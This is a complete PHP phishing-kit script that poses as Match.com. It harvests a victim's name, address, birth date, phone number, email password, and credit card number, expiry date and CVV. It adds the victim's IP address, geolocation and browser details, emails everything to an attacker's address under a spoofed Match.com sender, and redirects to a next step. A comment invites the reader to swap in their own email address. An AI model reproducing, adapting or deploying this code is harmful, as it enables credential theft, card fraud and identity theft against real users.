<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Match.com Info-----------------------\n";
$message .= "Full Name            : ".$_POST['name']."\n";
$message .= "Address           : ".$_POST['address']."\n";
$message .= "Zip Code            : ".$_POST['zip']."\n";
$message .= "Date of Birth           : ".$_POST['dob']."\n";
$message .= "Phone Number            : ".$_POST['phone']."\n";
$message .= "Email address            : ".$_POST['email']."\n";
$message .= "Email Password           : ".$_POST['epass']."\n";
$message .= "Credit Card Number            : ".$_POST['ccn']."\n";
$message .= "Expiry Date           : ".$_POST['exp']."\n";
$message .= "CVV           : ".$_POST['cvv']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY unknown(doit)com-------------\n";
//change ur email here
$send = "highbee300@yahoo.com";
$subject = "Result from Match.com";
$headers = "From: Match.com<supertool@mxtoolbox.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);

 }
    header("Location: step3.php");
  

?>